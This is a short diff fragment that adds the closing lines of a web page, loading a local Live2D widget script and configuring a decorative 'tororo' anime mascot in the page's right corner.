+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
